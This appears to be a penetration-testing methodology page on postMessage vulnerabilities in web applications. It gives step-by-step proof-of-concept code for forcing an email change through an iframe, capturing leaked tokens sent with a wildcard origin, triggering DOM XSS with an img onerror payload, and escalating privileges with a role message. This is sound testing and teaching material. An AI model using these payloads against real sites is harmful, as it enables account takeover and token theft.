# Web Messaging

## Check List

## Methodology

### Black Box

#### Missing Origin Validation in postMessage Listener

{% stepper %}
{% step %}
Open the application in browser
{% endstep %}

{% step %}
Inspect JavaScript files for message event listeners

```js
window.addEventListener("message", function(event){
   processMessage(event.data);
});
```
{% endstep %}

{% step %}
Verify whether origin validation is implemented

```js
if(event.origin !== "https://trusted.com") return;
```
{% endstep %}

{% step %}
If no origin check exists, listener accepts messages from any domain
{% endstep %}

{% step %}
Login to your account, Open browser console and send crafted message manually

```js
window.postMessage({action:"changeEmail",email:"attacker@test.com"},"*");
```
{% endstep %}

{% step %}
If application processes message without validating origin, improper Web Messaging validation exists, Create external PoC page

```html
<html>
<body>
<iframe id="target" src="https://target.com"></iframe>
<script>
setTimeout(function(){
 document.getElementById("target").contentWindow.postMessage(
   {action:"changeEmail",email:"attacker@test.com"},
   "*"
 );
},3000);
</script>
</body>
</html>
```
{% endstep %}

{% step %}
Host the PoC on attacker domain
{% endstep %}

{% step %}
Open PoC while authenticated to target.com, If sensitive action is executed, missing origin validation in Web Messaging is confirmed
{% endstep %}
{% endstepper %}

***

#### Wildcard Target Origin Usage

{% stepper %}
{% step %}
Inspect application JavaScript for outgoing postMessage calls

```js
otherWindow.postMessage({token:authToken},"*");
```
{% endstep %}

{% step %}
If target origin is set to `"*"`, sensitive data may be exposed
{% endstep %}

{% step %}
Create malicious page embedding target application via iframe

```html
<iframe id="victim" src="https://target.com"></iframe>
<script>
window.addEventListener("message",function(e){
   console.log("Leaked data:",e.data);
});
</script>
```
{% endstep %}

{% step %}
If target application sends authentication token or sensitive information via postMessage with wildcard origin, data leakage occurs
{% endstep %}

{% step %}
If attacker page receives sensitive data without restriction, Web Messaging misconfiguration is confirmed
{% endstep %}
{% endstepper %}

***

#### Insecure Message Handling Leading to DOM XSS

{% stepper %}
{% step %}
Inspect message handler logic

```js
window.addEventListener("message",function(e){
   document.getElementById("output").innerHTML = e.data;
});
```
{% endstep %}

{% step %}
If message data is written directly to DOM without sanitization, XSS risk exists
{% endstep %}

{% step %}
Login and open console and Send malicious message

```js
window.postMessage('<img src=x onerror=alert(1)>',"*");
```
{% endstep %}

{% step %}
If JavaScript executes in application context, DOM-based XSS via Web Messaging is confirmed
{% endstep %}

{% step %}
Create external PoC page sending malicious payload through iframe
{% endstep %}

{% step %}
If payload executes while victim is authenticated, stored or reflected DOM XSS through Web Messaging is confirmed
{% endstep %}
{% endstepper %}

***

#### Privilege Escalation via Message Parameter Manipulation

{% stepper %}
{% step %}
Inspect message listener controlling role or state:

```js
window.addEventListener("message",function(e){
   if(e.data.role){
      user.role = e.data.role;
   }
});
```
{% endstep %}

{% step %}
Open console and send manipulated role

```js
window.postMessage({role:"admin"},"*");
```
{% endstep %}

{% step %}
Attempt to access admin endpoint

```http
GET /api/admin/dashboard HTTP/1.1
Host: target.com
Cookie: session=abc123
```
{% endstep %}

{% step %}
If server trusts client-side role modified via message event and grants privileged access, integrity control through Web Messaging is broken
{% endstep %}

{% step %}
If unauthorized privilege escalation occurs due to unvalidated postMessage data, Web Messaging vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
